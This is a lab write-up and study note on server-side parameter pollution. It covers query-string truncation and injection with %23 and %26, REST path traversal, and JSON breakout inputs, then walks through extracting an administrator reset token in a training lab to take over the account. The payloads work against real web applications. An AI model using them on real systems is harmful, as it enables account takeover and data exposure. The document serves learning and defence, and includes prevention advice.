# Server-Side Parameter Pollution

## Overview

This section focused on server-side parameter pollution and how user-controlled input can affect requests made by the application to internal APIs.

The main goal was to understand how an application may take user input and include it in a server-side request without properly encoding it.

Topics covered:

- Query string pollution
- URL-encoded `#` (`%23`)
- URL-encoded `&` (`%26`)
- Overriding existing parameters
- REST path pollution
- Structured data format pollution
- Automated tools
- Prevention
- Exploiting server-side parameter pollution in a query string

---

## 1. What is Server-Side Parameter Pollution?

Server-side parameter pollution can occur when a website takes user-controlled input and incorporates it into a request to an internal API without adequate encoding.

The internal API may not be directly accessible from the Internet.

The vulnerable application can act as an intermediary:

    User
      ↓
    Public Website
      ↓
    Server-side request
      ↓
    Internal API

The goal during testing is to determine whether user input can alter the structure or parameters of the internal request.

---

## 2. Testing User Input

Potentially interesting user-controlled input can include:

- Query parameters
- Form fields
- HTTP headers
- URL path parameters

The first step is to understand how the application transforms the supplied input into the server-side request.

---

## 3. Query String Pollution

Query string pollution occurs when user input is incorporated into a server-side query string.

Two important characters used during testing are:

    # → %23
    & → %26

The URL-encoded `#` can be used to truncate the server-side query string.

The URL-encoded `&` can be used to inject an additional parameter.

---

## 4. URL-Encoded `#`

The `#` character can be encoded as:

    %23

When included in user input, it may cause the remainder of the server-side query string to be ignored.

Example:

    username=administrator%23

During the lab, this produced:

    {
      "error": "Field not specified."
    }

This indicated that the expected `field` parameter was no longer present in the resulting internal request.

---

## 5. URL-Encoded `&`

The `&` character can be encoded as:

    %26

It can be used to attempt to inject another parameter into the server-side query string.

Example:

    username=administrator%26x=y

During the lab, the server responded:

    {
      "error": "Parameter is not supported."
    }

This showed that the injected `x=y` was being interpreted as a separate parameter by the internal API.

---

## 6. Injecting a Known Parameter

If a valid internal parameter can be identified, it may be possible to inject it into the server-side request.

During the lab, we tested:

    username=administrator%26field=x%23

The server responded:

    {
      "type": "ClientError",
      "code": 400,
      "error": "Invalid field."
    }

This was useful because it showed that:

- The `field` parameter was recognized.
- The supplied value `x` was invalid.
- The injected parameter was reaching the internal API.

---

## 7. Discovering Internal Parameter Names

After confirming that `field` was being processed, Burp Intruder was used to test possible server-side variable names.

The request structure was:

    username=administrator%26field=§x§%23

The built-in:

    Server-side variable names

payload list was used.

Examples of responses included:

    field=username

Response:

    {
      "type": "username",
      "result": "administrator"
    }

Another valid field was:

    field=email

which returned the administrator's email information in masked form.

This demonstrated that the `field` parameter could be used to request different pieces of information from the internal API.

---

## 8. Extracting the Reset Token

We then tested:

    field=reset_token

The final injected parameter was:

    username=administrator%26field=reset_token%23

The server responded:

    {
      "result": "rs22h1d9uttwfwrzlvscqqmzh23bdi54",
      "type": "reset_token"
    }

The response revealed the administrator's password reset token.

---

## 9. Using the Reset Token

The reset token was then supplied to the password reset functionality.

Example:

    /forgot-password?reset_token=rs22h1d9uttwfwrzlvscqqmzh23bdi54

The application displayed the password reset form.

The password was reset, allowing us to authenticate as the administrator.

After logging in as the administrator, we accessed the Admin panel and deleted:

    carlos

The application displayed:

    User deleted successfully!

The lab was successfully completed.

---

## 10. Overriding Existing Parameters

Another technique covered was attempting to inject a parameter with the same name as an existing parameter.

For example:

    username=administrator&username=test

The way duplicate parameters are handled depends on the backend technology.

Examples covered:

    PHP
    → parses only the last parameter

    ASP.NET
    → combines both parameters

    Node.js / Express
    → parses only the first parameter

Therefore, when testing duplicate parameters, the server-side technology and its parameter parsing behavior are important.

---

## 11. REST Path Pollution

Server-side parameter pollution can also occur when user input is inserted into a URL path.

Example internal API:

    /api/private/users/peter

If `peter` is controlled by the user, we can test path traversal characters.

Example:

    peter%2f..%2fadmin

The resulting internal request may become:

    /api/private/users/peter/../admin

If the path is normalized, it may resolve to:

    /api/private/users/admin

This can potentially allow access to another API resource.

---

## 12. Structured Data Format Pollution

User input can also be inserted into structured data such as JSON or XML.

For example, the application may create an internal JSON request:

    {
      "name": "peter"
    }

If user input is not properly encoded, an attacker may attempt to break out of the intended JSON value.

Example input:

    peter","access_level":"administrator

The resulting server-side JSON could potentially become:

    {
      "name": "peter",
      "access_level": "administrator"
    }

This demonstrates structured data format pollution.

The same general concept can apply to other structured formats, not only JSON.

---

## 13. Automated Tools

Burp Scanner can detect suspicious input transformations during an audit.

A suspicious transformation does not automatically mean that a vulnerability exists.

Manual testing is required to determine whether the behavior is actually exploitable.

Another tool covered was:

    Backslash Powered Scanner

It can classify inputs as:

    boring
    interesting
    vulnerable

Inputs classified as `interesting` require further manual investigation.

---

## 14. Prevention

The main prevention approach is to properly encode user input before including it in server-side requests.

Applications should also ensure that input:

- Matches the expected format
- Follows the expected structure
- Contains only allowed characters where appropriate

An allowlist can be used to define characters that do not need encoding.

Other user-controlled characters should be properly encoded before being inserted into server-side requests.

---

## 15. Lab - Exploiting Server-Side Parameter Pollution in a Query String

### Objective

The objective was to:

    1. Log in as the administrator.
    2. Delete the user "carlos".

### Attack Flow

    Trigger password reset
            ↓
    Analyze server response
            ↓
    Test %26
            ↓
    Confirm parameter injection
            ↓
    Test %23
            ↓
    Confirm query truncation
            ↓
    Identify "field" parameter
            ↓
    Use Burp Intruder
            ↓
    Discover "reset_token"
            ↓
    Extract administrator reset token
            ↓
    Reset administrator password
            ↓
    Login as administrator
            ↓
    Delete "carlos"
            ↓
    Lab solved

### Important Requests

Initial injection:

    username=administrator%26x=y

Response:

    {
      "error": "Parameter is not supported."
    }

Query truncation:

    username=administrator%23

Response:

    {
      "error": "Field not specified."
    }

Parameter identification:

    username=administrator%26field=x%23

Response:

    {
      "type": "ClientError",
      "code": 400,
      "error": "Invalid field."
    }

Reset token extraction:

    username=administrator%26field=reset_token%23

Response:

    {
      "result": "rs22h1d9uttwfwrzlvscqqmzh23bdi54",
      "type": "reset_token"
    }

Final impact:

    Administrator access obtained
    ↓
    "carlos" deleted
    ↓
    User deleted successfully!

Status:

    SOLVED

---

## 16. Key Takeaways

- Server-side parameter pollution occurs when user input can influence the structure of a server-side request.
- `%26` can be used to test for additional parameter injection.
- `%23` can be used to test for query string truncation.
- Error messages can reveal how an internal API parses injected parameters.
- Once a valid internal parameter is identified, its possible values can be tested.
- Burp Intruder can help discover valid server-side parameter names.
- Server-side parameter pollution can occur in query strings, REST paths, and structured data.
- Automated detection can identify suspicious transformations, but manual verification is required.
- Proper input encoding and validation help prevent server-side parameter pollution.